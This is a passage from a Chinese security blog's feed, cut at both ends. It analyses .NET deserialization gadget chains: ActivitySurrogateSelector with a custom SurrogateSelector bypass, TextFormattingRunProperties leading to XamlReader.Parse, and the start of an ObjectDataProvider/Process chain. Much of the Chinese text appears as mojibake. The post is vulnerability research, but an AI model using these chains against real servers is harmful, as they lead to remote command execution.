MemoryStream();</span><br><span class="line">            binaryFormatter.Serialize(memoryStream, personal);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­<code>personal</code>æ—¢æ²¡æœ‰å®ç°<code>ISerializable</code>æ¥å£ä¹Ÿæ²¡æœ‰è¢«<code>Serilizable</code>ç‰¹æ€§ä¿®é¥°ï¼Œæ­£å¸¸æ¥è¯´æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„ï¼Œä¸è¿‡æˆ‘ä»¬é€šè¿‡åˆ›å»º<code>SurrogateSelector</code>å¹¶è®¾ç½®<code>Surrogate</code>æ¥å®ç°<code>Personal</code>å¯¹è±¡çš„æ­£ç¡®åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚<br>é€šè¿‡<code>Surrogate</code>çš„ç‰¹æ€§æˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ä¸­ä½¿ç”¨å“ªäº›æ­£å¸¸æ¥è¯´ä¸å¯ä»¥è¢«åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»å‹ã€‚ä¸è¿‡ä»ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬ä¹ŸçŸ¥é“ï¼Œè¦æƒ³å®ç°å¯¹æŸä¸ªç‰¹å®šçš„ä¸å¯åºåˆ—åŒ–ç±»çš„åºåˆ—åŒ–éœ€è¦æˆ‘ä»¬åœ¨æœåŠ¡ç«¯åˆ›å»ºå¯¹åº”çš„<code>Surrogate</code>å¹¶å®ç°<code>ISerializationSurrogate</code>æ¥å£ï¼Œ<br>ç„¶ååœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è¿›è¡Œé…ç½®ï¼Œè€ŒæœåŠ¡ç«¯çš„ä»£ç é€»è¾‘æ˜¯æˆ‘ä»¬åœ¨æ”»å‡»è¿‡ç¨‹ä¸­å½±å“ä¸äº†çš„ï¼Œè¿™æ ·çœ‹èµ·æ¥<code>Suggogate</code>å¹¶æ²¡æœ‰ç”¨æ­¦ä¹‹åœ°ã€‚<br>å¤©æ— ç»äººä¹‹è·¯ï¼Œå­˜åœ¨è¿™æ ·ä¸€ä¸ªç‰¹æ®Šçš„<code>SurrogateSeletor</code> <code>ActivitySurrogateSelector</code> å…¶<code>GetSurrogate</code>æ–¹æ³•åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¯ä»¥è¿”å›ä¸€ä¸ª<code>ObjectSurrogate</code>ç±»å‹çš„<code>Surrogate</code>  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (type == <span class="literal">null</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			selector = <span class="keyword">this</span>;</span><br><span class="line">			ISerializationSurrogate serializationSurrogate = <span class="literal">null</span>;</span><br><span class="line">			<span class="built_in">bool</span> flag;</span><br><span class="line">			<span class="keyword">lock</span> (ActivitySurrogateSelector.surrogateCache)</span><br><span class="line">			&#123;</span><br><span class="line">				flag = ActivitySurrogateSelector.surrogateCache.TryGetValue(type, <span class="keyword">out</span> serializationSurrogate);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (serializationSurrogate != <span class="literal">null</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> serializationSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">typeof</span>(Activity).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.activitySurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(ActivityExecutor).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.activityExecutorSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(IDictionary&lt;DependencyProperty, <span class="built_in">object</span>&gt;).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.dependencyStoreSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(XmlDocument).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.domDocSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(Queue) == type)</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.queueSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(Guid) == type)</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.simpleTypesSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(ActivityBind).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.objectSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(DependencyObject).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.objectSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">lock</span> (ActivitySurrogateSelector.surrogateCache)</span><br><span class="line">				&#123;</span><br><span class="line">					ActivitySurrogateSelector.surrogateCache[type] = serializationSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (serializationSurrogate != <span class="literal">null</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> serializationSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>ä»ä¸Šé¢çš„ä»£ç å¯çŸ¥è¦æƒ³è·å–<code>ObjectSurrogate</code>ç±»å‹çš„<code>Surrogate</code>éœ€è¦æ»¡è¶³åºåˆ—åŒ–ç±»ä¸º<code>DependencyObject</code>æˆ–è€…<code>ActivityBind</code>çš„å­ç±»ï¼Œè¿™æ ·å°±é™åˆ¶äº†æˆ‘ä»¬çš„å‘æŒ¥ã€‚<br>ä¸è¿‡è™½ç„¶<code>ActivitySurrogateSelector</code>çš„<code>GetSurrogate</code>æ–¹æ³•æœ‰è¿™ä¸ªé™åˆ¶ï¼Œä½†æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ª<code>SurrogateSelector</code>æ¥ç»•å¼€è¿™ä¸ªé™åˆ¶ï¼Œä»è€Œå®Œæˆä½¿ç”¨<code>ObjectSurrogate</code>çš„<code>getObjectData</code>æ–¹æ³•æ¥è¿›è¡Œåºåˆ—åŒ–ã€‚  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶å€™å°±åˆå­˜åœ¨é—®é¢˜äº†ï¼Œè¿™ä¸è¿˜æ˜¯åœ¨æ”¹å˜åºåˆ—åŒ–çš„è¿‡ç¨‹å—ï¼Œå¦‚æœååºåˆ—åŒ–çš„è¿‡ç¨‹æ²¡æœ‰è®¾ç½®å¯¹åº”çš„<code>Surrogate</code>ä¸è¿˜æ˜¯ä¸èƒ½æˆåŠŸè¿›è¡Œæ¼æ´åˆ©ç”¨å—ï¼Ÿ<br>è¿™é‡Œå°±ä¸å¾—ä¸æåˆ°<code>ObjectSurrogate</code>ç¥å¥‡çš„<code>GetObjectData</code>æ–¹æ³•äº†ã€‚<br>åœ¨è¯¥æ–¹æ³•ä¸­è°ƒç”¨äº†<code>info.SetType</code>è®¾ç½®äº†ååºåˆ—åŒ–è¿‡ç¨‹ä¸­<code>obj</code>çš„å®é™…ç±»å‹ä¸º<code>ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å‘åºåˆ—åŒ–è¿‡ç¨‹ä¸­å°†ä¸ä¼šç«‹å³å¾—åˆ°åŸå§‹çš„objï¼Œè€Œæ˜¯å…ˆå¾—åˆ°<code>ObjectSerializedRef</code>ç±»å‹ã€‚</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">			&#123;</span><br><span class="line">				info.AddValue(<span class="string">&quot;type&quot;</span>, obj.GetType());</span><br><span class="line">				<span class="built_in">string</span>[] array = <span class="literal">null</span>;</span><br><span class="line">				MemberInfo[] serializableMembers = FormatterServicesNoSerializableCheck.GetSerializableMembers(obj.GetType(), <span class="keyword">out</span> array);</span><br><span class="line">				<span class="built_in">object</span>[] objectData = FormatterServices.GetObjectData(obj, serializableMembers);</span><br><span class="line">				info.AddValue(<span class="string">&quot;memberDatas&quot;</span>, objectData);</span><br><span class="line">				info.SetType(<span class="keyword">typeof</span>(ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
<p><code>ObjectSerializedRef</code>å®ç°äº†	<code>IObjectReference</code>ä»¥åŠ<code>IDeserializationCallback</code>æ¥å£ï¼Œè¿™ä¸¤ä¸ªæ¥å£åˆ†åˆ«åŒ…æ‹¬æ–¹æ³•<code>GetRealObject</code>ä»¥åŠ<code>OnDeserialization</code>æ–¹æ³•ã€‚<br><code>GetRealObject</code>ä¸<code>OnDeserialization</code>æ–¹æ³•å‡åœ¨å¯¹è±¡å›¾æ„é€ å®Œæˆåæ‰§è¡Œï¼Œå³<code>ObjectSerializedRef</code>å¯¹è±¡æ„é€ å®Œæˆåæ‰§è¡Œï¼Œä¸”<code>GetRealObject</code>æ–¹æ³•å…ˆäº<code>OnDeserialization</code>æ–¹æ³•æ‰§è¡Œï¼Œä¸»è¦ä½œç”¨æ˜¯æ§åˆ¶ååºåˆ—åŒ–åçš„å®é™…å¯¹è±¡è¿”å›ï¼Œ<br>è€Œ<code>OnDeserialization</code>åˆ™ç”¨äºåœ¨æ‰€æœ‰å­—æ®µéƒ½æ¢å¤åè¿›è¡Œåˆå§‹åŒ–æˆ–éªŒè¯æ“ä½œã€‚<br><code>GetRealObject</code>æ–¹æ³•è°ƒç”¨<code>GetUninitializedObject</code>é€šè¿‡<code>this.type</code>æ„é€ ç›®æ ‡å¯¹è±¡ï¼Œè€Œ<code>this.type</code>æˆ‘ä»¬é€šè¿‡<code>ObjectSurrogate</code>çš„<code>getObjectData</code>æ–¹æ³•å¯ä»¥çŸ¥é“æ˜¯å“ªä¸ªæœ€åˆåºåˆ—åŒ–çš„ä¸å¯åºåˆ—åŒ–çš„ç±»ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­å³<code>Personal</code>ã€‚  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">object</span> IObjectReference.GetRealObject(StreamingContext context)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject == <span class="literal">null</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">this</span>.returnedObject = FormatterServices.GetUninitializedObject(<span class="keyword">this</span>.type);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">this</span>.returnedObject;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>
<p><code>OnDeserialization</code>æ–¹æ³•ç”¨äºè¿˜åŸ<code>Personal</code>å¯¹è±¡çš„æˆå‘˜å˜é‡çš„å€¼ã€‚</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> IDeserializationCallback.OnDeserialization(<span class="built_in">object</span> sender)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject != <span class="literal">null</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">string</span>[] array = <span class="literal">null</span>;</span><br><span class="line">						MemberInfo[] serializableMembers = FormatterServicesNoSerializableCheck.GetSerializableMembers(<span class="keyword">this</span>.type, <span class="keyword">out</span> array);</span><br><span class="line">						FormatterServices.PopulateObjectMembers(<span class="keyword">this</span>.returnedObject, serializableMembers, <span class="keyword">this</span>.memberDatas);</span><br><span class="line">						<span class="keyword">this</span>.returnedObject = <span class="literal">null</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±æ­¤æˆ‘ä»¬çŸ¥é“äº†æˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰<code>SurroGateSeletor</code>è¿”å›<code>ObjectSurrogate</code>å®ç°å¯¹ä¸å¯åºåˆ—åŒ–å¯¹è±¡çš„åºåˆ—åŒ–ï¼Œå¹¶ä¸”è¿™æ ·åºåˆ—åŒ–çš„ç»“æœå­—ç¬¦ä¸²å³ä¾¿åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­<code>BinarryFormatter</code>æ²¡æœ‰è®¾ç½®å¯¹åº”çš„<code>SurroGateSeletor</code>çš„æƒ…å†µä¸‹ä¹Ÿèƒ½è¢«æˆåŠŸååºåˆ—åŒ–ï¼Œ<br>å› ä¸ºå…¶ä½¿ç”¨äº†<code>ObjectSerializedRef</code>è¿™ä¸ªå¯ä»¥åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„ç±»å¯¹é‚£äº›ä¸å¯åºåˆ—åŒ–çš„ç±»è¿›è¡Œäº†åŒ…è£…ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>C#</tag>
        <tag>BinnaryFormatter</tag>
        <tag>ActivitySurrogateSelector</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä¸‰å‘³ä¹¦å±‹åˆ°ç™¾è‰å ‚ã€ä»XmlSerializeråˆ°BinnaryFormatterä¹‹BinaryFormatterååºåˆ—åŒ–æ¼æ´TextFormattingRunPropertiesåˆ©ç”¨é“¾</title>
    <url>/archives/323962a4.html</url>
    <content><![CDATA[<h1 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h1><p><code>TextFormattingRunProperties</code>å®ç°äº†<code>System.Runtime.Serialization.ISerializable</code>æ¥å£ï¼Œæ•…å…¶åœ¨åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨æ‰§è¡Œ<code>GetObjectData</code>ä»¥åŠç‰¹å®šçš„æ„é€ æ–¹æ³•<code>internal TextFormattingRunProperties(SerializationInfo info, StreamingContext context)</code><br><img src="/archives/323962a4/0880c08b011096a4b93d.png" alt="img1"><br>æˆ‘ä»¬ç›´æ¥ä»ååºåˆ—åŒ–æ—¶æ‰§è¡Œçš„ç‰¹æ®Šæ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹å¼€å§‹ã€‚<br>åœ¨è°ƒç”¨æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡æœŸé—´ä¼šè°ƒç”¨<code>GetObjectFromSerializationInfo</code>æ–¹æ³•ä»<code>serializationInfo</code>ä¸­è·å–å±æ€§å€¼ã€‚  </p>
<span id="more"></span>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="title">TextFormattingRunProperties</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>._foregroundBrush = (Brush)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;ForegroundBrush&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._backgroundBrush = (Brush)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;BackgroundBrush&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._size = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;FontRenderingSize&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._hintingSize = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;FontHintingSize&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._foregroundOpacity = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;ForegroundOpacity&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._backgroundOpacity = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;BackgroundOpacity&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._italic = (<span class="built_in">bool</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;Italic&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._bold = (<span class="built_in">bool</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;Bold&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._textDecorations = (TextDecorationCollection)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;TextDecorations&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._textEffects = (TextEffectCollection)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;TextEffects&quot;</span>, info);</span><br><span class="line">	<span class="built_in">string</span> text = (<span class="built_in">string</span>)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;CultureInfoName&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._cultureInfo = ((text == <span class="literal">null</span>) ? <span class="literal">null</span> : <span class="keyword">new</span> CultureInfo(text));</span><br><span class="line">	FontFamily fontFamily = <span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;FontFamily&quot;</span>, info) <span class="keyword">as</span> FontFamily;</span><br><span class="line">	<span class="built_in">bool</span> flag = fontFamily != <span class="literal">null</span>;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>GetObjectFromSerializationInfo</code>æ–¹æ³•ä¸­ä¼šè°ƒç”¨<code>XamlReader.Parse</code>æ–¹æ³•å¯¹ä»<code>serializationInfo</code>è·å–çš„å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œé€šè¿‡ä¸Šä¸€ç¯‡æ–‡ç« <a href="archives/ff457959.html">ä»ä¸‰å‘³ä¹¦å±‹åˆ°ç™¾è‰å ‚ï¼Œä»XmlSerializeråˆ°BinnaryFormatterä¹‹XmlSerializerååºåˆ—åŒ–æ¼æ´ObjectDataProvideråˆ©ç”¨é“¾</a>æˆ‘ä»¬çŸ¥é“<br><code>XamlReader</code>çš„<code>Parse</code>æ–¹æ³•å¯ä»¥è§£æ<code>XAML</code>å­—ç¬¦ä¸²å¹¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†<code>TextFormattingRunProperties</code>æŸä¸€ä¸ªå­—æ®µçš„å€¼è®¾ç½®ä¸ºç¬¦åˆ<code>XamlReader</code>è§£ææ¡ä»¶çš„<code>Payload</code>å³å¯è¿›è¡Œååºåˆ—åŒ–æ¼æ´æ”»å‡»ã€‚  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">object</span> <span class="title">GetObjectFromSerializationInfo</span>(<span class="params"><span class="built_in">string</span> name, SerializationInfo info</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">string</span> @string = info.GetString(name);</span><br><span class="line">			<span class="built_in">bool</span> flag = @string == <span class="string">&quot;null&quot;</span>;</span><br><span class="line">			<span class="built_in">object</span> result;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">			&#123;</span><br><span class="line">				result = <span class="literal">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				result = XamlReader.Parse(@string);</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
<p><code>serializationInfo</code>ä¸­çš„å€¼ç”±<code>GetObjectData</code>æ–¹æ³•åœ¨åºåˆ—åŒ–çš„æ—¶å€™è®¾ç½®  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">bool</span> flag = info == <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;info&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	info.AddValue(<span class="string">&quot;BackgroundBrush&quot;</span>, <span class="keyword">this</span>.BackgroundBrushEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.BackgroundBrush));</span><br><span class="line">	info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, <span class="keyword">this</span>.ForegroundBrushEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.ForegroundBrush));</span><br><span class="line">	info.AddValue(<span class="string">&quot;FontHintingSize&quot;</span>, <span class="keyword">this</span>.FontHintingEmSizeEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.FontHintingEmSize));</span><br><span class="line">	info.AddValue(<span class="string">&quot;FontRenderingSize&quot;</span>, <span class="keyword">this</span>.FontRenderingEmSizeEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.FontRenderingEmSize));</span><br><span class="line">	info.AddValue(<span class="string">&quot;TextDecorations&quot;</span>, <span class="keyword">this</span>.TextDecorationsEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.TextDecorations));</span><br><span class="line">	info.AddValue(<span class="string">&quot;TextEffects&quot;</span>, <span class="keyword">this</span>.TextEffectsEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.TextEffects));</span><br><span class="line">	info.AddValue(<span class="string">&quot;CultureInfoName&quot;</span>, <span class="keyword">this</span>.CultureInfoEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.CultureInfo.Name));</span><br><span class="line">	info.AddValue(<span class="string">&quot;FontFamily&quot;</span>, <span class="keyword">this</span>.TypefaceEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.Typeface.FontFamily));</span><br><span class="line">	info.AddValue(<span class="string">&quot;Italic&quot;</span>, <span class="keyword">this</span>.ItalicEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.Italic));</span><br><span class="line">	info.AddValue(<span class="string">&quot;Bold&quot;</span>, <span class="keyword">this</span>.BoldEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.Bold));</span><br><span class="line">	info.AddValue(<span class="string">&quot;ForegroundOpacity&quot;</span>, <span class="keyword">this</span>.ForegroundOpacityEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.ForegroundOpacity));</span><br><span class="line">	info.AddValue(<span class="string">&quot;BackgroundOpacity&quot;</span>, <span class="keyword">this</span>.BackgroundOpacityEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.BackgroundOpacity));</span><br><span class="line">	<span class="built_in">bool</span> flag2 = !<span class="keyword">this</span>.TypefaceEmpty;</span><br><span class="line">	<span class="keyword">if</span> (flag2)</span><br><span class="line">	&#123;</span><br><span class="line">		info.AddValue(<span class="string">&quot;Typeface.Style&quot;</span>, XamlWriter.Save(<span class="keyword">this</span>.Typeface.Style));</span><br><span class="line">		info.AddValue(<span class="string">&quot;Typeface.Weight&quot;</span>, XamlWriter.Save(<span class="keyword">this</span>.Typeface.Weight));</span><br><span class="line">		info.AddValue(<span class="string">&quot;Typeface.Stretch&quot;</span>, XamlWriter.Save(<span class="keyword">this</span>.Typeface.Stretch));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºåœ¨<code>TextFormattingRunProperties</code>å¯¹è±¡åˆ›å»ºæ—¶ç¬¬ä¸€ä¸ªè¢«è·å–çš„å±æ€§æ˜¯<code>ForegroundBrush</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åˆ›å»º<code>TextFormattingRunProperties</code>å¯¹è±¡æ—¶å¯ä»¥å°†<code>ForegroundBrush</code>è®¾ç½®ä¸ºæˆ‘ä»¬çš„<code>Payload</code><br>&#96;</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>C# - ååºåˆ—åŒ–</tag>
        <tag>XmlSerializer</tag>
        <tag>BinaryFormatter</tag>
        <tag>TextFormattingRunProperties</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä¸‰å‘³ä¹¦å±‹åˆ°ç™¾è‰å ‚ï¼Œä»XmlSerializeråˆ°BinnaryFormatterä¹‹XmlSerializerååºåˆ—åŒ–æ¼æ´ObjectDataProvideråˆ©ç”¨é“¾</title>
    <url>/archives/ff457959.html</url>
    <content><![CDATA[<h1 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h1><p>æˆ‘ä»¬å…ˆä»<code>ObjectDataProvider</code>å¼€å§‹ï¼Œæœ‰ä¸‹é¢ä¸€æ®µä»£ç   </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">			odp.ObjectInstance = <span class="keyword">new</span> Process();</span><br><span class="line">            